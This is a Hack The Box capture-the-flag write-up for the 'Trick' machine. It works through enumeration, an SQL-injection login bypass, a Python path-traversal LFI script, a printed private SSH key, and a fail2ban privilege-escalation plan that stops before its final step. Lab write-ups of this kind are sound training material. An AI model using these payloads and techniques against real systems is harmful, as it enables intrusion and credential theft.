---
author: Supaaasuge
title: Trick - HTB Writeup
date: 2024-05-06
Lastmod: 2024-05-06
description: "Writeup for the Hack The Box room Trick."
categories:
  - Hack The Box
tags:
  - SQLi
---
# Trick - HTB Writeup
**Difficulty**: Easy

## Enumeration
Starting off, I ran an `nmap` scan on all open ports at a rate of `10000`. Moving on from there, I ran a service version scan, TCP scan, and operating system detection scan on the ports that I discoverd.

```bash
nmap -p- --open --min-rate 10000 $IP
# Nmap 7.94SVN scan initiated Mon May  6 14:32:07 2024 as: nmap -p- --open --min-rate 10000 -oN init.scan 10.129.227.180
Nmap scan report for 10.129.227.180
Host is up (0.40s latency).
Not shown: 47512 filtered tcp ports (no-response), 18019 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http

# Nmap done at Mon May  6 14:32:56 2024 -- 1 IP address (1 host up) scanned in 48.89 seconds
```
Moving on...
```bash
sudo nmap -p22,25,53,80 -sCVT -A -O $IP
# Nmap 7.94SVN scan initiated Mon May  6 14:42:11 2024 as: nmap -p22,25,80,54 -sCV -A -Pn -oN scva.scan 10.129.227.180
Nmap scan report for 10.129.227.180
Host is up (0.41s latency).

PORT   STATE  SERVICE VERSION
22/tcp open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open   smtp?
|_smtp-commands: Couldn't establish connection on port 25
54/tcp closed xns-ch
80/tcp open   http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 54/tcp)
HOP RTT       ADDRESS
1   401.27 ms 10.10.14.1
2   401.48 ms 10.129.227.180

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May  6 14:46:51 2024 -- 1 IP address (1 host up) scanned in 280.00 seconds
```

From here, I decided to try some DNS enumeration of the records using `dig`. Usually hack the box domains are just the room name with `.htb` appended so naturally my first thought was to check the dns records of `trick.htb` to see if anything would come back:
```bash
dig axfr @$IP trick.htb

; <<>> DiG 9.19.21-1-Debian <<>> axfr @10.129.227.180 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 331 msec
;; SERVER: 10.129.227.180#53(10.129.227.180) (TCP)
;; WHEN: Mon May 06 15:04:34 EDT 2024
;; XFR size: 6 records (messages 1, bytes 231)
```
from the results, we can see there is `preprod-payroll.trick.htb` and `root.trick.htb` along with `trick.htb`. Let's go ahead and add these to `/etc/hosts` so that our browser know's what IP address to point to for this domain:
```bash
echo $IP 'trick.htb preprod-payroll.htb trick.htb' | sudo tee -a /etc/hosts
```
If i didn't want to guess the domain, you could also run:
```bash
dig +noall +answer @$IP -x $IP
[SNIP] ... trick.htb
```

Before I move onto the website and further enumeration of subdomains, I decided to enumerate the `smtp` service on port `25` using the `smtp-user-enum` script and the `/usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt`.
```bash

```


we can see from the output that the default character size of the response is 5,480 characters so we then use `--hh 5480` to properly filter these results.

No new subdomains were found, unlucky. Next, I will move on to directory brute-forcing with `feroxbuster`
```bash
feroxbuster -u http://trick.htb/ --smart
```

### SQL Injection
After opening firefox and heading over to `http://preprod-payroll.trick.htb` we can see that it is a login page. I then started testing out different XSS/SQLi payloads. The payload that allowed us to bypass authentication is: `' OR 1=1- --`. After putting this is both the username and password field, we can see that we successfully by pass the authentication in the login page. Because we have SQLi here, I am going go ahead and capture this request using burp suite, save it to a file, then run `sqlmap` on it to see if I can't dump the full database and it's tables. The first few times I ran sqlmap, I did not get much back. However each run, I increaded `--level` and `--risk` +1. With sqlmap running in the background, I decided to check out the Recruitment Management System dashboard now that we had access as an administrator. After checking the `Users` page from the sidebar, there is a listing to perform an "Action" on the user `Enemigosss`. When you click edit, you can see the password is blocked out as follows:
![enemigosss](/posts/image.png)


To find the actual value of the password, we can simply inspect the source code for the page by pressing `CTRL+U` or right clicking and then scrolling down and clicking `Inspect(Q)`. After doing this, we can see the password in plaintext:

![alt text](/posts/image-1.png)

At this point, I tried using this password for SSH authentication but did not have success. At this point, I decided to just keep fuzzing using a bunch of different wordlists. Because we already have quite a few different subdomains, I figured it's likely there are other similar domains etc. To do this, I used the tool `wfuzz`:

```bash
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hc 400,403,404 -H "Host: preprod-FUZZ.trick.htb" -u http://trick.htb/ -t 40 --hw 475
```
From this, after only a little bit of waiting we find another endpoint:
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://trick.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload   
=====================================================================

000000668:   200        178 L    631 W      9660 Ch     "marketing
                                                        "         
000005905:   302        266 L    527 W      9546 Ch     "payroll"

```
Then, adding this to our `/etc/hosts`:
```bash
echo $IP 'preprod-marketing.trick.htb' | sudo tee -a /etc/hosts
```

Now I will check this site out using firefox... Something I notice pretty quickly after I began clicking around a bit was the URL scheme, and how it was rendering pages:
Ex:
`http://preprod-marketing.trick.htb/index.php?page=services.html`

### Shell as michael

Given the fact it is specifying a particular page in the page parameter, I decided to try various LFI payloads to see it I could get any success. After trying `/etc/passwd` and a bunch of bypassd techniques, I had no success. However, I should note that replacing `index.php` in the page parameter caused the same page to be rendered as `index.php`. So this means that it's being filtered using a `PHP` filter. So, I decided to try and use some PHP filter's to render the different pages as shown [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#wrapper-phpfilter). Along with some other bypasses. After I found a working payload (`....//`, due to str_replace of `../`)... Here is the script I wrote to more easily get file inclusion:
```python
import requests
import sys


url = "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//{}"



passwd = sys.argv[1]
if not passwd:
    print("Usage: python lfi.py <file path>")

if passwd.startswith('/'):
    payload = passwd.replace('/', '')
else:
    payload = passwd


resp = requests.get(url.format(payload))
print(resp.text)
```

Also, I should mention that before I did this I did check the `about.html` page from `preprod-marketing.trick.htb` and wrote down a list of all the names I found, including:

```
levi
mari
jen
jen terry
levi moore
erik
erik morris
michael
michael owen
```

I then used this list and tried to check out any home directories with any readable private SSH keys:
```bash
python lfi.py home/michael/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```
Nice! I then re-ran the above command but appended `> id_rsa` to the command to output the key to a file. Then after changing the permissions to the correct permissions, I was able to get a shell via SSH and the user `michael`.
```bash
chmod 600 id_rsa
ssh michael@10.129.227.180 -i id_rsa
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri May 10 22:35:10 2024 from 10.10.14.55
michael@trick:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
michael@trick:~$ cat user.txt
7c78cd882b52c9c9343a18c6a4770fcd

```
#### Post-exploitation/Privilege escalation

##### Environement variables
```
SHELL=/bin/bash
LANGUAGE=en_US:en
PWD=/home/michael
LOGNAME=michael
XDG_SESSION_TYPE=tty
HOME=/home/michael
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=10.10.14.55 56330 10.129.227.180 22
XDG_SESSION_CLASS=user
TERM=xterm-256color
USER=michael
SHLVL=1
XDG_SESSION_ID=964
XDG_RUNTIME_DIR=/run/user/1001
SSH_CLIENT=10.10.14.55 56330 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus
MAIL=/var/mail/michael
SSH_TTY=/dev/pts/1
_=/usr/bin/env

```



##### OS Information
```bash
cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"


cat /proc/version
Linux version 4.19.0-20-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.235-1 (2022-03-17)

uname -mrs
Linux 4.19.0-20-amd64 x86_64

```

##### Users and groups
```
awk -F':' '{ print $1}' /etc/passwd
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
_apt
systemd-timesync
systemd-network
systemd-resolve
messagebus
tss
dnsmasq
usbmux
rtkit
pulse
speech-dispatcher
avahi
saned
colord
geoclue
hplip
Debian-gdm
systemd-coredump
mysql
sshd
postfix
bind
michael
===================
------Groups-------
===================
awk -F':' '{ print $1}' /etc/group
root
daemon
bin
sys
adm
tty
disk
lp
mail
news
uucp
man
proxy
kmem
dialout
fax
voice
cdrom
floppy
tape
sudo
audio
dip
www-data
backup
operator
list
irc
src
gnats
shadow
utmp
video
sasl
plugdev
staff
games
users
nogroup
systemd-journal
systemd-timesync
systemd-network
systemd-resolve
input
kvm
render
crontab
netdev
messagebus
tss
bluetooth
ssl-cert
rtkit
ssh
lpadmin
scanner
pulse
pulse-access
avahi
saned
colord
geoclue
Debian-gdm
systemd-coredump
mysql
postfix
postdrop
bind
michael
security
```

##### Kernel Information
```bash
$ uname -ar
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64 GNU/Linux
```
##### Sudo privileges
```bash
sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

Searching google for `fail2ban sudo privilege escalation` brings many results, however [this](https://juggernaut-sec.com/fail2ban-lpe/) link and [this one as well](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/) I found to be the most directly beneficial.


### Shell as root
fail2ban is an intrustion prevention software framework to help stop brute force attacks.

According to the articles above, if we can execute `fail2ban` as root, we can gain access to privileges by modifying the configuration file. We need to check if the config file is writable:

```bash
find /etc -writable -ls 2>/dev/null

   269281      4 drwxrwx---   2 root     security     4096 May 10 23:30 /etc/fail2ban/action.d
```

Look inside of `/etc/fail2ban/jail.conf` to know more about how fail2ban is configured.

In this, we can not that `iptables-multiport` is the default actrion to run. The important line is the `actionban` which runs each time an IP hits the defined threshold.


To get root, all we need to do is modify the `actionban` action in `/etc/fail2ban/action.d/iptables-multipath.conf` to make a copy of `bash` and set the SetUID which we can use to start a new bash shell with the privileges of the `root` user:
```
